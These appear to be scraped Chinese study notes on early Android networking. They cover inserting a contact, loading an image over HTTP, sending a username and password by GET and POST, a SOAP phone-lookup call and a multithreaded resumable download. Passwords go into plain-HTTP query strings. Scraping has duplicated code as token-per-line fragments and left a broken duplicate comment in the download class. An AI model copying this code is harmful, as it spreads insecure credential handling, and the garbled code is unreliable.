         String database = "content://com.android.contacts/data" ;
         ContentValues nameValues = new ContentValues();
         nameValues.put( "mimetype" , "vnd.android.cursor.item/name" );
         nameValues.put( "data1" , "wangwu" );
         nameValues.put( "raw_contact_id" , id);
         getContext().getContentResolver().insert(Uri.parse(database), nameValues);
         
         ContentValues phoneValues = new ContentValues();
         phoneValues.put( "mimetype" , "vnd.android.cursor.item/phone_v2" );
         phoneValues.put( "data1" , "999999" );
         phoneValues.put( "raw_contact_id" , id);
         getContext().getContentResolver().insert(Uri.parse(database), phoneValues);
         
         ContentValues emailValues = new ContentValues();
         emailValues.put( "mimetype" , "vnd.android.cursor.item/email_v2" );
         emailValues.put( "data1" , "wangwu@sina.cn" );
         emailValues.put( "raw_contact_id" , id);
         getContext().getContentResolver().insert(Uri.parse(database), emailValues);  
    }  
}




url什么之类的找的时候直接去看源代码，github上有


 <ImageView
        android:id="@+id/iv_image"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"  
        android:scaleType="center" />这是重点


    <EditText
        android:id="@+id/et_address"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:text="http://192.168.1.247:8080/tomcat.png"
        android:lines="2" />   注意这儿
==========================从Internet获取数据=====================
<!-- 访问internet权限 -->
<uses-permission android:name="android.permission.INTERNET"/>
public class DemoActivity extends Activity implements OnClickListener { private EditText mEtAddress; private Button mBtView; private ImageView mIvView;      @Override     public void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);         setContentView(R.layout.main);         mEtAddress = (EditText) this.findViewById(R.id.et_address);         mBtView = (Button) this.findViewById(R.id.bt_view);         mIvView = (ImageView) this.findViewById(R.id.iv_image);                  mBtView.setOnClickListener(this);              }  public void onClick(View v) { switch (v.getId()) { case R.id.bt_view: //按钮对应的点击事件  String address = mEtAddress.getText().toString().trim(); if("".equals(address)){ Toast.makeText(this, "图片地址不能为空", Toast.LENGTH_SHORT).show(); return; } try { Bitmap bitmap = ImageUtil.getImage(address); mIvView.setImageBitmap(bitmap); } catch (Exception e) { if(e instanceof SocketTimeoutException){ Toast.makeText(this, "网络连接超时", Toast.LENGTH_SHORT).show(); }else if(e instanceof IOException){ Toast.makeText(this, "读取数据错误 ", Toast.LENGTH_SHORT).show(); }else{ Toast.makeText(this, "未知错误 ", Toast.LENGTH_SHORT).show(); } e.printStackTrace(); } break;   }  } }  public class ImageUtil { /**  * 获取网络address地址对应的图片  * @param address  * @return bitmap的类型   */ public static Bitmap getImage(String address) throws Exception{ //通过代码 模拟器浏览器访问图片的流程  URL url = new URL(address); HttpURLConnection conn =  (HttpURLConnection) url.openConnection(); conn.setRequestMethod("GET"); conn.setConnectTimeout(5000); //获取服务器返回回来的流  InputStream is = conn.getInputStream(); byte[] imagebytes = StreamTool.getBytes(is); Bitmap bitmap = BitmapFactory.decodeByteArray(imagebytes, 0, imagebytes.length); return bitmap; } }  public class StreamTool { /** * 把一个inputstream里面的内容转化成一个byte[]  */  public static byte[] getBytes(InputStream is) throws Exception{ ByteArrayOutputStream bos = new ByteArrayOutputStream(); byte[] buffer = new byte[1024]; int len = 0; while((len = is.read(buffer))!=-1){ bos.write(buffer, 0, len); } is.close(); bos.flush(); byte[] result = bos.toByteArray(); System.out.println(new String(result)); return  result; } }

86
 
1
public
 
class
 
DemoActivity
 
extends
 
Activity
 
implements
 
OnClickListener
 {
2
    
private
 
EditText
 
mEtAddress
;
3
    
private
 
Button
 
mBtView
;
4
    
private
 
ImageView
 
mIvView
;
5
    
6
    
@Override
7
    
public
 
void
 
onCreate
(
Bundle
 
savedInstanceState
) {
8
        
super
.
onCreate
(
savedInstanceState
);
9
        
setContentView
(
R
.
layout
.
main
);
10
        
mEtAddress
 
=
 (
EditText
) 
this
.
findViewById
(
R
.
id
.
et_address
);
11
        
mBtView
 
=
 (
Button
) 
this
.
findViewById
(
R
.
id
.
bt_view
);
12
        
mIvView
 
=
 (
ImageView
) 
this
.
findViewById
(
R
.
id
.
iv_image
);
13
        
14
        
mBtView
.
setOnClickListener
(
this
);
15
        
16
    }
17
18
    
public
 
void
 
onClick
(
View
 
v
) {
19
    
    
switch
 (
v
.
getId
()) {
20
    
    
case
 
R
.
id
.
bt_view
:
21
    
    
    
//按钮对应的点击事件 
22
    
    
    
String
 
address
 
=
 
mEtAddress
.
getText
().
toString
().
trim
();
23
    
    
    
if
(
""
.
equals
(
address
)){
24
    
    
    
    
Toast
.
makeText
(
this
, 
"图片地址不能为空"
, 
Toast
.
LENGTH_SHORT
).
show
();
25
    
    
    
    
return
;
26
    
    
    
}
27
    
    
    
try
 {
28
    
    
    
    
Bitmap
 
bitmap
 
=
 
ImageUtil
.
getImage
(
address
);
29
    
    
    
    
mIvView
.
setImageBitmap
(
bitmap
);
30
    
    
    
} 
catch
 (
Exception
 
e
) {
31
    
    
    
    
if
(
e
 
instanceof
 
SocketTimeoutException
){
32
    
    
    
    
    
Toast
.
makeText
(
this
, 
"网络连接超时"
, 
Toast
.
LENGTH_SHORT
).
show
();
33
    
    
    
    
}
else
 
if
(
e
 
instanceof
 
IOException
){
34
    
    
    
    
    
Toast
.
makeText
(
this
, 
"读取数据错误 "
, 
Toast
.
LENGTH_SHORT
).
show
();
35
    
    
    
    
}
else
{
36
    
    
    
    
    
Toast
.
makeText
(
this
, 
"未知错误 "
, 
Toast
.
LENGTH_SHORT
).
show
();
37
    
    
    
    
}
38
    
    
    
    
e
.
printStackTrace
();
39
    
    
    
}
40
    
    
    
break
;
41
42
43
    
    
}
44
    
    
45
    
}
46
}
47
48
public
 
class
 
ImageUtil
 {
49
/**
50
 
* 获取网络address地址对应的图片
51
 
* @param address
52
 
* @return bitmap的类型 
53
 
*/
54
    
public
 
static
 
Bitmap
 
getImage
(
String
 
address
) 
throws
 
Exception
{
55
    
    
//通过代码 模拟器浏览器访问图片的流程 
56
    
    
URL
 
url
 
=
 
new
 
URL
(
address
);
57
    
    
HttpURLConnection
 
conn
 
=
  (
HttpURLConnection
) 
url
.
openConnection
();
58
    
    
conn
.
setRequestMethod
(
"GET"
);
59
    
    
conn
.
setConnectTimeout
(
5000
);
60
    
    
//获取服务器返回回来的流 
61
    
    
InputStream
 
is
 
=
 
conn
.
getInputStream
();
62
    
    
byte
[] 
imagebytes
 
=
 
StreamTool
.
getBytes
(
is
);
63
    
    
Bitmap
 
bitmap
 
=
 
BitmapFactory
.
decodeByteArray
(
imagebytes
, 
0
, 
imagebytes
.
length
);
64
    
    
return
 
bitmap
;
65
    
}
66
}
67
68
public
 
class
 
StreamTool
 {
69
    
/**
70
    
 
* 把一个inputstream里面的内容转化成一个byte[] 
71
    
 
*/
72
    
73
    
public
 
static
 
byte
[] 
getBytes
(
InputStream
 
is
) 
throws
 
Exception
{
74
    
    
ByteArrayOutputStream
 
bos
 
=
 
new
 
ByteArrayOutputStream
();
75
    
    
byte
[] 
buffer
 
=
 
new
 
byte
[
1024
];
76
    
    
int
 
len
 
=
 
0
;
77
    
    
while
((
len
 
=
 
is
.
read
(
buffer
))
!=-
1
){
78
    
    
    
bos
.
write
(
buffer
, 
0
, 
len
);
79
    
    
}
80
    
    
is
.
close
();
81
    
    
bos
.
flush
();
82
    
    
byte
[] 
result
 
=
 
bos
.
toByteArray
();
83
    
    
System
.
out
.
println
(
new
 
String
(
result
));
84
    
    
return
  
result
;
85
    
}
86
}


public class DataService {  /** * 通过get请求提交数据到服务器 *  * @param path *            服务器servlet的地址 * @param name *            用户名 * @param password *            密码 * @return 服务器返回回来的string数据 */ public static String sendDataByGet(String path, String name, String password) throws Exception { String param1 = URLEncoder.encode(name); String param2 = URLEncoder.encode(password); URL url = new URL(path + "?name=" + param1 + "&password=" + param2); HttpURLConnection conn = (HttpURLConnection) url.openConnection();  conn.setRequestMethod("GET"); conn.setReadTimeout(5000); // 数据并没有发送给服务器 // 获取服务器返回的流信息 InputStream is = conn.getInputStream(); byte[] result = StreamTool.getBytes(is);  return new String(result); }  // get post // get 一次提交的数据数据量比较小 4K 内部其实通过组拼url的方式 // post 可以提交比较大的数据 form表单的形式 流的方式写到服务器 /** * 采用post的方式 提交数据到服务器 *  * @param path *            服务器servlet的地址 * @param name *            用户名 * @param password *            密码 * @return 服务器返回的数据信息 * @throws Exception */ public static String sendDataByPost(String path, String name, String password) throws Exception { String param1 = URLEncoder.encode(name); String param2 = URLEncoder.encode(password); URL url = new URL(path); HttpURLConnection conn = (HttpURLConnection) url.openConnection();  String data = "name=" + param1 + "&password=" + param2;  conn.setRequestMethod("POST"); conn.setConnectTimeout(5000); // 设置 http协议可以向服务器写数据 conn.setDoOutput(true); // 设置http协议的消息头 conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded"); conn.setRequestProperty("Content-Length", data.length() + ""); // 把我们准备好的data数据写给服务器 OutputStream os = conn.getOutputStream(); os.write(data.getBytes()); // httpurlconnection 底层实现 outputstream 是一个缓冲输出流 // 只要我们获取任何一个服务器返回的信息 , 数据就会被提交给服务器 , 得到服务器返回的流信息 int code = conn.getResponseCode(); if (code == 200) { InputStream is = conn.getInputStream(); byte[] result = StreamTool.getBytes(is); return new String(result); } else { throw new IllegalStateException("服务器状态异常"); } }   /** * httpclient 浏览器的简单包装  * new HttpClient 就相当于得到了一个浏览器  */ public static String sendDataByHttpClientGet (String path , String name,String password) throws Exception{  //1. 获取到一个浏览器的实例  HttpClient client = new DefaultHttpClient(); //2. 准备请求的地址  String param1 = URLEncoder.encode(name); String param2 = URLEncoder.encode(password); HttpGet httpGet = new HttpGet(path + "?name=" + param1 + "&password=" + param2);  //3. 敲回车 发请求  HttpResponse  ressponse = client.execute(httpGet); int code = ressponse.getStatusLine().getStatusCode(); if(code == 200){ InputStream is  =ressponse.getEntity().getContent(); byte[] result = StreamTool.getBytes(is); return new String(result); } else{ throw new IllegalStateException("服务器状态异常"); } }  public static String sendDataByHttpClientPost(String path , String name,String password) throws Exception{  //1. 获取到一个浏览器的实例  HttpClient client = new DefaultHttpClient(); //2. 准备要请求的 数据类型  HttpPost httppost = new HttpPost(path); // 键值对  List< NameValuePair> parameters = new ArrayList<NameValuePair>();  parameters.add(new BasicNameValuePair("name", name)); parameters.add(new BasicNameValuePair("password", password));  UrlEncodedFormEntity entity = new UrlEncodedFormEntity(parameters, "utf-8");   //3.设置post请求的数据实体  httppost.setEntity(entity);  //4. 发送数据给服务器 HttpResponse  ressponse = client.execute(httppost); int code = ressponse.getStatusLine().getStatusCode(); if(code == 200){ InputStream is  =ressponse.getEntity().getContent(); byte[] result = StreamTool.getBytes(is); return new String(result); } else{ throw new IllegalStateException("服务器状态异常"); } }  /** * 提交数据给服务器 带一个文件  * @param path * @param name * @param password * @param filepath 文件在手机上的路径  *  * @return * @throws Exception */ public  static String sendDataByHttpClientPost(String path , String name,String password ,String filepath) throws Exception{ // 实例化上传数据的 数组  part [] Part[] parts = {new StringPart("name", name),   new StringPart("password", password),   new FilePart("file", new File(filepath))};  PostMethod filePost = new PostMethod(path);    filePost.setRequestEntity(new MultipartRequestEntity(parts, filePost.getParams())); org.apache.commons.httpclient.HttpClient client = new org.apache.commons.httpclient.HttpClient();         client.getHttpConnectionManager().getParams()           .setConnectionTimeout(5000); int status = client.executeMethod(filePost); if(status==200){  System.out.println( filePost.getResponseCharSet()); String result = new String(filePost.getResponseBodyAsString()); String ha = new String ( result.getBytes("ISO-8859-1"),"UTF-8"); System.out.println(ha);  System.out.println("--"+result); return result; } else{ throw new IllegalStateException("服务器状态异常"); }   } }

175
 
1
public
 
class
 
DataService
 {
2
3
    
/**
4
    
 
* 通过get请求提交数据到服务器
5
    
 
* 
6
    
 
* @param path
7
    
 
*            服务器servlet的地址
8
    
 
* @param name
9
    
 
*            用户名
10
    
 
* @param password
11
    
 
*            密码
12
    
 
* @return 服务器返回回来的string数据
13
    
 
*/
14
    
public
 
static
 
String
 
sendDataByGet
(
String
 
path
, 
String
 
name
, 
String
 
password
)
15
    
    
    
throws
 
Exception
 {
16
    
    
String
 
param1
 
=
 
URLEncoder
.
encode
(
name
);
17
    
    
String
 
param2
 
=
 
URLEncoder
.
encode
(
password
);
18
    
    
URL
 
url
 
=
 
new
 
URL
(
path
 
+
 
"?name="
 
+
 
param1
 
+
 
"&password="
 
+
 
param2
);
19
    
    
HttpURLConnection
 
conn
 
=
 (
HttpURLConnection
) 
url
.
openConnection
();
20
21
    
    
conn
.
setRequestMethod
(
"GET"
);
22
    
    
conn
.
setReadTimeout
(
5000
);
23
    
    
// 数据并没有发送给服务器
24
    
    
// 获取服务器返回的流信息
25
    
    
InputStream
 
is
 
=
 
conn
.
getInputStream
();
26
    
    
byte
[] 
result
 
=
 
StreamTool
.
getBytes
(
is
);
27
28
    
    
return
 
new
 
String
(
result
);
29
    
}
30
31
    
// get post
32
    
// get 一次提交的数据数据量比较小 4K 内部其实通过组拼url的方式
33
    
// post 可以提交比较大的数据 form表单的形式 流的方式写到服务器
34
    
/**
35
    
 
* 采用post的方式 提交数据到服务器
36
    
 
* 
37
    
 
* @param path
38
    
 
*            服务器servlet的地址
39
    
 
* @param name
40
    
 
*            用户名
41
    
 
* @param password
42
    
 
*            密码
43
    
 
* @return 服务器返回的数据信息
44
    
 
* @throws Exception
45
    
 
*/
46
    
public
 
static
 
String
 
sendDataByPost
(
String
 
path
, 
String
 
name
,
47
    
    
    
String
 
password
) 
throws
 
Exception
 {
48
    
    
String
 
param1
 
=
 
URLEncoder
.
encode
(
name
);
49
    
    
String
 
param2
 
=
 
URLEncoder
.
encode
(
password
);
50
    
    
URL
 
url
 
=
 
new
 
URL
(
path
);
51
    
    
HttpURLConnection
 
conn
 
=
 (
HttpURLConnection
) 
url
.
openConnection
();
52
53
    
    
String
 
data
 
=
 
"name="
 
+
 
param1
 
+
 
"&password="
 
+
 
param2
;
54
55
    
    
conn
.
setRequestMethod
(
"POST"
);
56
    
    
conn
.
setConnectTimeout
(
5000
);
57
    
    
// 设置 http协议可以向服务器写数据
58
    
    
conn
.
setDoOutput
(
true
);
59
    
    
// 设置http协议的消息头
60
    
    
conn
.
setRequestProperty
(
"Content-Type"
,
61
    
    
    
    
"application/x-www-form-urlencoded"
);
62
    
    
conn
.
setRequestProperty
(
"Content-Length"
, 
data
.
length
() 
+
 
""
);
63
    
    
// 把我们准备好的data数据写给服务器
64
    
    
OutputStream
 
os
 
=
 
conn
.
getOutputStream
();
65
    
    
os
.
write
(
data
.
getBytes
());
66
    
    
// httpurlconnection 底层实现 outputstream 是一个缓冲输出流
67
    
    
// 只要我们获取任何一个服务器返回的信息 , 数据就会被提交给服务器 , 得到服务器返回的流信息
68
    
    
int
 
code
 
=
 
conn
.
getResponseCode
();
69
    
    
if
 (
code
 
==
 
200
) {
70
    
    
    
InputStream
 
is
 
=
 
conn
.
getInputStream
();
71
    
    
    
byte
[] 
result
 
=
 
StreamTool
.
getBytes
(
is
);
72
    
    
    
return
 
new
 
String
(
result
);
73
    
    
} 
else
 {
74
    
    
    
throw
 
new
 
IllegalStateException
(
"服务器状态异常"
);
75
    
    
}
76
    
}
77
    
78
    
79
    
/**
80
    
 
* httpclient 浏览器的简单包装 
81
    
 
* new HttpClient 就相当于得到了一个浏览器 
82
    
 
*/
83
    
public
 
static
 
String
 
sendDataByHttpClientGet
 (
String
 
path
 , 
String
 
name
,
String
 
password
) 
throws
 
Exception
{
84
    
    
85
    
    
//1. 获取到一个浏览器的实例 
86
    
    
HttpClient
 
client
 
=
 
new
 
DefaultHttpClient
();
87
    
    
//2. 准备请求的地址 
88
    
    
String
 
param1
 
=
 
URLEncoder
.
encode
(
name
);
89
    
    
String
 
param2
 
=
 
URLEncoder
.
encode
(
password
);
90
    
    
HttpGet
 
httpGet
 
=
 
new
 
HttpGet
(
path
 
+
 
"?name="
 
+
 
param1
 
+
 
"&password="
 
+
 
param2
);
91
    
    
92
    
    
//3. 敲回车 发请求 
93
    
    
HttpResponse
  
ressponse
 
=
 
client
.
execute
(
httpGet
);
94
    
    
int
 
code
 
=
 
ressponse
.
getStatusLine
().
getStatusCode
();
95
    
    
if
(
code
 
==
 
200
){
96
    
    
    
InputStream
 
is
  
=
ressponse
.
getEntity
().
getContent
();
97
    
    
    
byte
[] 
result
 
=
 
StreamTool
.
getBytes
(
is
);
98
    
    
    
return
 
new
 
String
(
result
);
99
    
    
}
100
    
    
else
{
101
    
    
    
throw
 
new
 
IllegalStateException
(
"服务器状态异常"
);
102
    
    
}
103
    
}
104
    
105
    
public
 
static
 
String
 
sendDataByHttpClientPost
(
String
 
path
 , 
String
 
name
,
String
 
password
) 
throws
 
Exception
{
106
    
    
107
    
    
//1. 获取到一个浏览器的实例 
108
    
    
HttpClient
 
client
 
=
 
new
 
DefaultHttpClient
();
109
    
    
//2. 准备要请求的 数据类型 
110
    
    
HttpPost
 
httppost
 
=
 
new
 
HttpPost
(
path
);
111
    
    
// 键值对 
112
    
    
List
<
 
NameValuePair
>
 
parameters
 
=
 
new
 
ArrayList
<
NameValuePair
>
();
113
    
    
114
    
    
parameters
.
add
(
new
 
BasicNameValuePair
(
"name"
, 
name
));
115
    
    
parameters
.
add
(
new
 
BasicNameValuePair
(
"password"
, 
password
));
116
    
    
117
    
    
UrlEncodedFormEntity
 
entity
 
=
 
new
 
UrlEncodedFormEntity
(
parameters
, 
"utf-8"
);
118
    
    
119
    
    
120
    
    
//3.设置post请求的数据实体 
121
    
    
httppost
.
setEntity
(
entity
);
122
    
    
123
    
    
//4. 发送数据给服务器
124
    
    
HttpResponse
  
ressponse
 
=
 
client
.
execute
(
httppost
);
125
    
    
int
 
code
 
=
 
ressponse
.
getStatusLine
().
getStatusCode
();
126
    
    
if
(
code
 
==
 
200
){
127
    
    
    
InputStream
 
is
  
=
ressponse
.
getEntity
().
getContent
();
128
    
    
    
byte
[] 
result
 
=
 
StreamTool
.
getBytes
(
is
);
129
    
    
    
return
 
new
 
String
(
result
);
130
    
    
}
131
    
    
else
{
132
    
    
    
throw
 
new
 
IllegalStateException
(
"服务器状态异常"
);
133
    
    
}
134
    
}
135
    
136
    
/**
137
    
 
* 提交数据给服务器 带一个文件 
138
    
 
* @param path
139
    
 
* @param name
140
    
 
* @param password
141
    
 
* @param filepath 文件在手机上的路径 
142
    
 
* 
143
    
 
* @return
144
    
 
* @throws Exception
145
    
 
*/
146
    
public
  
static
 
String
 
sendDataByHttpClientPost
(
String
 
path
 , 
String
 
name
,
String
 
password
 ,
String
 
filepath
) 
throws
 
Exception
{
147
    
    
// 实例化上传数据的 数组  part []
148
    
    
Part
[] 
parts
 
=
 {
new
 
StringPart
(
"name"
, 
name
), 
149
    
    
    
    
  
new
 
StringPart
(
"password"
, 
password
), 
150
    
    
    
    
  
new
 
FilePart
(
"file"
, 
new
 
File
(
filepath
))};
151
    
    
152
    
    
PostMethod
 
filePost
 
=
 
new
 
PostMethod
(
path
);
153
    
    
154
    
  
155
    
    
filePost
.
setRequestEntity
(
new
 
MultipartRequestEntity
(
parts
, 
filePost
.
getParams
()));
156
    
    
org
.
apache
.
commons
.
httpclient
.
HttpClient
 
client
 
=
 
new
 
org
.
apache
.
commons
.
httpclient
.
HttpClient
();
157
        
client
.
getHttpConnectionManager
().
getParams
()
158
          .
setConnectionTimeout
(
5000
);
159
    
    
int
 
status
 
=
 
client
.
executeMethod
(
filePost
);
160
    
    
if
(
status
==
200
){
161
    
    
    
162
    
    
    
System
.
out
.
println
( 
filePost
.
getResponseCharSet
());
163
    
    
    
String
 
result
 
=
 
new
 
String
(
filePost
.
getResponseBodyAsString
());
164
    
    
    
String
 
ha
 
=
 
new
 
String
 ( 
result
.
getBytes
(
"ISO-8859-1"
),
"UTF-8"
);
165
    
    
    
System
.
out
.
println
(
ha
);
166
    
    
    
167
    
    
    
System
.
out
.
println
(
"--"
+
result
);
168
    
    
    
return
 
result
;
169
    
    
}
170
    
    
else
{
171
    
    
    
throw
 
new
 
IllegalStateException
(
"服务器状态异常"
);
172
    
    
}
173
 
174
    
}
175
}


=====================soap--简单对象访问协议  请求webservice================
<?xml version="1.0" encoding="utf-8"?> <soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">   <soap12:Body>     <getMobileCodeInfo xmlns="http://WebXml.com.cn/">       <mobileCode>$mobile</mobileCode>       <userID>b4983a54931848c5b8373b56456f8c02</userID>     </getMobileCodeInfo>   </soap12:Body> </soap12:Envelope>

9
 
1
<?xml
 
version="1.0" encoding="utf-8"?>
2
<
soap12:Envelope
 
xmlns:xsi
=
"http://www.w3.org/2001/XMLSchema-instance"
 
xmlns:xsd
=
"http://www.w3.org/2001/XMLSchema"
 
xmlns:soap12
=
"http://www.w3.org/2003/05/soap-envelope"
>
3
  
<
soap12:Body
>
4
    
<
getMobileCodeInfo
 
xmlns
=
"http://WebXml.com.cn/"
>
5
      
<
mobileCode
>
$mobile
</
mobileCode
>
6
      
<
userID
>
b4983a54931848c5b8373b56456f8c02
</
userID
>
7
    
</
getMobileCodeInfo
>
8
  
</
soap12:Body
>
9
</
soap12:Envelope
>
public class TestQueryAddress extends AndroidTestCase {   public void testGetAddress() throws Exception{ URL  url = new URL("http://webservice.webxml.com.cn/WebServices/MobileCodeWS.asmx"); HttpURLConnection conn =  (HttpURLConnection) url.openConnection(); conn.setConnectTimeout(5000); conn.setRequestMethod("POST"); InputStream  is = getClass().getClassLoader().getResourceAsStream("data.xml"); byte [] data = StreamTool.getBytes(is); String str = new String(data); String content = str.replace("$mobile", "13512345678"); System.out.println(content); conn.setDoOutput(true); conn.setRequestProperty("Content-Type", "application/soap+xml; charset=utf-8"); conn.setRequestProperty("Content-Length", content.length()+"");  conn.getOutputStream().write(content.getBytes());  InputStream response = conn.getInputStream(); System.out.println( new String( StreamTool.getBytes(response))); } }

23
 
1
public
 
class
 
TestQueryAddress
 
extends
 
AndroidTestCase
 {
2
3
    
4
    
public
 
void
 
testGetAddress
() 
throws
 
Exception
{
5
    
    
URL
  
url
 
=
 
new
 
URL
(
"http://webservice.webxml.com.cn/WebServices/MobileCodeWS.asmx"
);
6
    
    
HttpURLConnection
 
conn
 
=
  (
HttpURLConnection
) 
url
.
openConnection
();
7
    
    
conn
.
setConnectTimeout
(
5000
);
8
    
    
conn
.
setRequestMethod
(
"POST"
);
9
    
    
InputStream
  
is
 
=
 
getClass
().
getClassLoader
().
getResourceAsStream
(
"data.xml"
);
10
    
    
byte
 [] 
data
 
=
 
StreamTool
.
getBytes
(
is
);
11
    
    
String
 
str
 
=
 
new
 
String
(
data
);
12
    
    
String
 
content
 
=
 
str
.
replace
(
"$mobile"
, 
"13512345678"
);
13
    
    
System
.
out
.
println
(
content
);
14
    
    
conn
.
setDoOutput
(
true
);
15
    
    
conn
.
setRequestProperty
(
"Content-Type"
, 
"application/soap+xml; charset=utf-8"
);
16
    
    
conn
.
setRequestProperty
(
"Content-Length"
, 
content
.
length
()
+
""
);
17
    
    
18
    
    
conn
.
getOutputStream
().
write
(
content
.
getBytes
());
19
    
    
20
    
    
InputStream
 
response
 
=
 
conn
.
getInputStream
();
21
    
    
System
.
out
.
println
( 
new
 
String
( 
StreamTool
.
getBytes
(
response
)));
22
    
}
23
}


===========================多线程下载=========================






只有创建view对象的线程 才可以操作他里面的view对象 .


android 设计  为了避免 多个子线程同时操作界面.


只有主线程 才可以更新操作界面
所有的更新操作界面的 工作 都由主线程来完成 

public
 
class
 DemoActivity 
extends
 Activity 
implements
 OnClickListener {

    
private
 ProgressBar pb;

    
private
 Button bt;

    
private
 TextView tv;

    
private
 EditText et;

    
boolean
 flag 
=
 true;

    
boolean
 stopflag 
=
 false;

    
private
 Handler handler 
=
 
new
 Handler() {

        @Override

        
public
 
void
 handleMessage(Message msg) {

            pb.setProgress(total);

            
int
 max 
=
 pb.getMax();

            
if
 (total 
>
=
 (max 
-
 
1
)) {

                total 
=
 max;

                flag 
=
 false;

            }

            
int
 result 
=
 total 
*
 
100
 
/
 max;

            tv.setText(
"当前进度 :"
 
+
 result 
+
 
"%"
);

            
super
.handleMessage(msg);

        }

    };

    
int
 total 
=
 
0
;

    @Override

    
public
 
void
 onCreate(Bundle savedInstanceState) {

        
super
.onCreate(savedInstanceState);

        setContentView(R.layout.main);

        pb 
=
 (ProgressBar) 
this
.findViewById(R.id.pb);

        bt 
=
 (Button) 
this
.findViewById(R.id.bt);

        tv 
=
 (TextView) 
this
.findViewById(R.id.tv_process);

        et 
=
 (EditText) 
this
.findViewById(R.id.et);

        bt.setOnClickListener(
this
);

    }

    @Override

    
public
 
void
 onClick(View v) {

        
switch
 (v.getId()) {

        
case
 R.id.bt
:

            
// 创建一个子线程 定期的更新ui

            
if
(
"开始下载"
.equals(bt.getText().toString())){

                bt.setText(
"暂停"
);

                stopflag 
=
 false; 
//开始下载 

            }

            
else
 {

                bt.setText(
"开始下载"
);

                stopflag 
=
 true;

            }

        new Thread(){

			@Override
			public void run() {
				for(int i = 0;i<100;i++){
		/*			tv.setText("当前为"+ i);*/
					try {
						sleep(500);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
					Message msg = new Message();
					msg.obj = i;
					handler.sendMessage(msg);
					
				}
				super.run();
			}
        }.start();

                
// 开始执行下载的操作

                String path 
=
 et.getText().toString().trim();

                
if
 (
""
.equals(path)) {

                    Toast.makeText(
this
, 
"路径不能为空"
, 
1
).show();

                    
return
;

                }

                
try
 {

                    URL url 
=
 
new
 URL(path);

                    HttpURLConnection conn 
=
 (HttpURLConnection) url

                            .openConnection();

                    conn.setRequestMethod(
"GET"
);

                    conn.setConnectTimeout(
5000
);

                    conn.setRequestProperty(
"User-Agent"
,

                            
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
);

                    
int
 code 
=
 conn.getResponseCode();

                    
if
 (code 
==
 
200
) {

                        
int
 len 
=
 conn.getContentLength();

                        RandomAccessFile file 
=
 
new
 RandomAccessFile(

                                
"/mnt/sdcard/"
 
+
 getFilenName(path), 
"rwd"
);

                        
// 1.设置本地文件大小跟服务器的文件大小一致

                        file.setLength(len);

                        
// 设置进度条的最大值

                        pb.setMax(len);

                        
// 2 .假设开启3 个线程

                        
int
 threadnumber 
=
 
3
;

                        
int
 blocksize 
=
 len 
/
 threadnumber;

                        
/**

                         * 线程1 0~ blocksize 线程2 1*bolocksize ~ 2*blocksize 线程3

                         * 2*blocksize ~ 文件末尾

                         */

                         * 线程1 0~ blocksize 线程2 1*bolocksize ~ 2*blocksize 线程3

                         * 2*blocksize ~ 文件末尾

                         */

                        
for
 (
int
 i 
=
 
0
; i 
<
 threadnumber; i
++
) {

                            
int
 startposition 
=
 i 
*
 blocksize;

                            
int
 endpositon 
=
 (i 
+
 
1
) 
*
 blocksize;

                            
if
 (i 
==
 (threadnumber 
-
 
1
)) {

                                
// 最后一个线程

                                endpositon 
=
 len;

                            }

                            DownLoadTask task 
=
 
new
 DownLoadTask(i, path,

                                    startposition, endpositon);

                            task.start();

                        }

                    }

                } 
catch
 (Exception e) {

                    Toast.makeText(
this
, 
"下载出现异常"
, 
0
).show();

                    e.printStackTrace();

                }

            

            
break
;

        }

    }

    
class
 DownLoadTask 
extends
 Thread {

        
int
 threadid;

        String filepath;

        
int
 startposition;

        
int
 endpositon;

        
public
 DownLoadTask(
int
 threadid, String filepath, 
int
 startposition,

                
int
 endpositon) {

            
this
.threadid 
=
 threadid;

            
this
.filepath 
=
 filepath;

            
this
.startposition 
=
 startposition;

            
this
.endpositon 
=
 endpositon;

        }

        @Override

        
public
 
void
 run() {

            
try
 {
//postionfile目的是为了记录文件的位置

                File postionfile 
=
 
new
 File(
"/mnt/sdcard/"
 
+
 threadid 
+
 
".txt"
);

                URL url 
=
 
new
 URL(filepath);

                HttpURLConnection conn 
=
 (HttpURLConnection) url

                        .openConnection();

                System.out.println(
"线程"
 
+
 threadid 
+
 
"正在下载 "
 
+
 
"开始位置 : "

                        
+
 startposition 
+
 
"结束位置 "
 
+
 endpositon);

                
if
 (postionfile.exists()) {

                    FileInputStream fis 
=
 
new
 FileInputStream(postionfile);

                    
byte
[] result 
=
 StreamTool.getBytes(fis);

                    String str 
=
 
new
 String(result);

                    
if
 (
!
""
.equals(str)) {

                        
int
 newstartposition 
=
 Integer.parseInt(str);

                        
if
 (newstartposition 
>
 startposition) {

                            startposition 
=
 newstartposition;

                        }

                    }

                }

                
// "Range", "bytes=2097152-4194303")

                conn.setRequestProperty(
"Range"
, 
"bytes="
 
+
 startposition 
+
 
"-"

                        
+
 endpositon);

                conn.setRequestMethod(
"GET"
);

                conn.setConnectTimeout(
5000
);

                conn.setRequestProperty(
"User-Agent"
,

                        
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
);

                InputStream is 
=
 conn.getInputStream();

                RandomAccessFile file 
=
 
new
 RandomAccessFile(
"/mnt/sdcard/"

                        
+
 getFilenName(filepath), 
"rwd"
);

                
// 设置 数据从文件哪个位置开始写

                file.seek(startposition);

                
byte
[] buffer 
=
 
new
 
byte
[
1024
];

                
int
 len 
=
 
0
;

                
// 代表当前读到的服务器数据的位置 ,同时这个值已经存储的文件的位置

                
int
 currentPostion 
=
 startposition;

                
// 创建一个文件对象 ,记录当前某个文件的下载位置

                
while
 ((len 
=
 is.read(buffer)) 
!=
 
-
1
) {

                    
if
 (stopflag) {

                        
return
;

                    }

                    file.write(buffer, 
0
, len);

                    
synchronized
 (DemoActivity.
this
) {

                        total 
+=
 len;

                    }

                    currentPostion 
+=
 len;

                    
// 需要把currentPostion 信息给持久化到存储设备

                    String position 
=
 currentPostion 
+
 
""
;

                    FileOutputStream fos 
=
 
new
 FileOutputStream(postionfile);

                    fos.write(position.getBytes());

                    fos.flush();

                    fos.close();

                }

